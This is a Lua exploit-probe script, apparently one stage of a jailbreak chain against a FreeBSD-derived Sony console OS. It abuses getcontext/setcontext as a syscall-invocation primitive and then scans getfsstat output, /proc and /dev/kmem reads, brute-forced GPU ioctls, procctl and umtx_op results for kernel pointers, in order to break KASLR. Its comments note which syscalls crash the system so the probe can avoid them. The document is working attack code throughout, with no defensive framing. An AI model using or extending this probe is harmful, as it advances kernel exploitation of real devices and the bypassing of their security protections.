-- CRASH_CLASS: LOW
-- PROBE 138g: getfsstat, /proc exploration, gc ioctl, procctl
--
-- Avoids lethal syscalls: kldstat, kenv, modfnext all kill.
-- Tests remaining untried KASLR vectors.

print("=== PROBE 138g: FSSTAT+PROC+GC ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh2, rl2 = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh2, rl2 - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local buf1 = gpu + 0x100
local buf2 = gpu + 0x500

--------------------------------------------------------------------
-- A: getfsstat(18) — mounted filesystem info
--------------------------------------------------------------------
print("")
print("--- [A] getfsstat ---")
local rv_cnt = srop(18, uint64(0), uint64(0), uint64(2))
local cntH, cntL = get_hi_lo(rv_cnt)
print("[A] count=" .. hex(rv_cnt))
if cntL > 0 and cntL < 50 and cntH == 0 then
    local statfs_sz = 0x230
    local need = math.min(cntL, 6) * statfs_sz
    local fs_buf = gpu + 0x2000
    zero(fs_buf, need)
    local rv_fs = srop(18, ua(fs_buf), uint64(need), uint64(2))
    local fsh, fsl = get_hi_lo(rv_fs)
    print("[A] getfsstat=" .. hex(rv_fs))
    if fsl > 0 and fsl <= cntL and fsh == 0 then
        for i = 0, math.min(fsl, 6) - 1 do
            local base = fs_buf + (i * statfs_sz)
            local fstype = ""
            for j = 0, 15 do
                local b = to_num(memory.read_byte(base + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then fstype = fstype .. string.char(b) end
            end
            local mnt = ""
            for j = 0, 79 do
                local b = to_num(memory.read_byte(base + 0x58 + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then mnt = mnt .. string.char(b) end
            end
            local from = ""
            for j = 0, 79 do
                local b = to_num(memory.read_byte(base + 0x458 + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then from = from .. string.char(b) end
            end
            print(string.format("[A] fs%d: type=%s mount=%s from=%s", i, fstype, mnt, from))
            for off = 0, statfs_sz - 1, 8 do
                local v = safe_rq(base + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[A] *** KPTR fs%d+0x%03X: %s ***", i, off, hex(v)))
                    end
                end
            end
        end
    end
else
    print("[A] getfsstat count=0 or fail")
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: /proc filesystem
--------------------------------------------------------------------
print("")
print("--- [B] /proc ---")
local proc_paths = {
    "/proc/curproc/map", "/proc/self/maps", "/proc/curproc/status",
    "/proc/curproc/ctl", "/proc", "/proc/curproc",
    "/dev/mem", "/dev/kmem", "/dev/pf",
}
for _, p in ipairs(proc_paths) do
    ws(buf1, p)
    local fd = srop(5, ua(buf1), uint64(0x0004))  -- O_RDONLY|O_NONBLOCK
    local fh, fl = get_hi_lo(fd)
    if fl > 0 and fl < 256 and fh == 0 then
        print(string.format("[B] *** %s OPENED fd=%d! ***", p, fl))
        zero(buf2, 0x400)
        local rv_rd = srop(3, uint64(fl), ua(buf2), uint64(0x400))
        local rdh, rdl = get_hi_lo(rv_rd)
        if rdl > 0 and rdl <= 0x400 and rdh == 0 then
            print(string.format("[B] read %d bytes!", rdl))
            local s = ""
            for i = 0, math.min(rdl, 200) - 1 do
                local b = to_num(memory.read_byte(buf2 + i))
                if b >= 32 and b < 127 then s = s .. string.char(b)
                elseif b == 10 then s = s .. "\\n"
                elseif b == 0 then s = s .. "\\0"
                else s = s .. string.format("\\x%02X", b) end
            end
            print("[B] " .. s)
            for off = 0, math.min(rdl, 0x400) - 1, 8 do
                local v = safe_rq(buf2 + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[B] *** KPTR %s+0x%02X: %s ***", p, off, hex(v)))
                    end
                end
            end
        else
            print(string.format("[B] %s read=%s", p, hex(rv_rd)))
        end
        srop(6, uint64(fl))
    else
        print(string.format("[B] %s = FAIL", p))
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: gc ioctl (GPU compute device)
--------------------------------------------------------------------
print("")
print("--- [C] gc ioctl ---")
ws(buf1, "/dev/gc")
local gc_fd = srop(5, ua(buf1), uint64(2))
local gch, gcl = get_hi_lo(gc_fd)
if gcl > 0 and gcl < 256 and gch == 0 then
    print("[C] gc fd=" .. gcl)
    local io_buf = gpu + 0xE000
    local hits = 0
    -- Try Sony GPU codes: group 'G'=0x47, 'g'=0x67
    for _, grp in ipairs({0x47, 0x67, 0x44, 0x53}) do
        for cmd = 0, 15 do
            for _, sz in ipairs({4, 8, 16, 32, 64}) do
                zero(io_buf, 0x100)
                local code = 0x40000000 + (sz * 0x10000) + (grp * 0x100) + cmd
                local rv = srop(54, uint64(gcl), uint64(code), ua(io_buf))
                local ivh, ivl = get_hi_lo(rv)
                if ivl == 0 and ivh == 0 then
                    hits = hits + 1
                    print(string.format("[C] *** ioctl 0x%08X (grp=%c cmd=%d sz=%d) WORKS!",
                        code, grp, cmd, sz))
                    for off = 0, math.min(sz, 64) - 1, 8 do
                        local v = safe_rq(io_buf + off)
                        if v then
                            local vh, vl = get_hi_lo(v)
                            if vh > 0 or vl > 0 then
                                print(string.format("  +0x%02X: %s", off, hex(v)))
                            end
                            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                                kfound = kfound + 1
                                print("  *** KERNEL POINTER! ***")
                            end
                        end
                    end
                end
            end
        end
    end
    print("[C] gc ioctl hits=" .. hits)
    srop(6, uint64(gcl))
else
    print("[C] gc OPEN FAIL")
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: procctl(544) — process control
--------------------------------------------------------------------
print("")
print("--- [D] procctl ---")
-- int procctl(idtype_t idtype, id_t id, int cmd, void *data)
-- idtype: P_PID=0
-- cmd values to try
local proc_cmds = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12}
for _, cmd in ipairs(proc_cmds) do
    zero(buf2, 0x100)
    local rv = srop(544, uint64(0), uint64(pid), uint64(cmd), ua(buf2))
    local pvh, pvl = get_hi_lo(rv)
    if pvl == 0 and pvh == 0 then
        print(string.format("[D] *** procctl(cmd=%d) WORKS!", cmd))
        for off = 0, 0x40, 8 do
            local v = safe_rq(buf2 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  +0x%02X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
    end
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: umtx_op(454) — test ops that might leak kernel object ptrs
--------------------------------------------------------------------
print("")
print("--- [E] umtx_op ---")
-- int _umtx_op(void *obj, int op, u_long val, void *uaddr, void *uaddr2)
-- Test various ops with output buffers to see if kernel writes pointers
local umtx_obj = gpu + 0xC000
zero(umtx_obj, 0x100)
-- Op 17 = UMTX_OP_NWAKE_PRIVATE — notify waiters
-- Op 22 = UMTX_OP_SEM2_WAIT
-- Op 23 = UMTX_OP_SEM2_WAKE
-- Op 25 = UMTX_OP_SHM (shared memory)
-- Op 26 = UMTX_OP_ROBUST_LISTS
local umtx_ops = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 21, 22, 23, 25, 26}
for _, op in ipairs(umtx_ops) do
    zero(buf2, 0x100)
    memory.write_dword(umtx_obj, 0)
    local rv = srop(454, ua(umtx_obj), uint64(op), uint64(0), ua(buf2), uint64(0))
    local uvh, uvl = get_hi_lo(rv)
    if uvl == 0 and uvh == 0 then
        print(string.format("[E] umtx_op(%d)=OK", op))
        for off = 0, 0x40, 8 do
            local v = safe_rq(buf2 + off)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh > 0 or vl > 0 then
                    print(string.format("  buf+0x%02X: %s", off, hex(v)))
                end
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print("  *** KERNEL POINTER! ***")
                end
            end
        end
        -- Also check if kernel wrote back into obj
        local obj_val = safe_rq(umtx_obj)
        if obj_val then
            local oh, ol = get_hi_lo(obj_val)
            if oh >= 0xFFFF8000 and oh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("[E] *** KPTR in umtx obj for op %d: %s ***", op, hex(obj_val)))
            end
        end
    end
end
print("[E] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
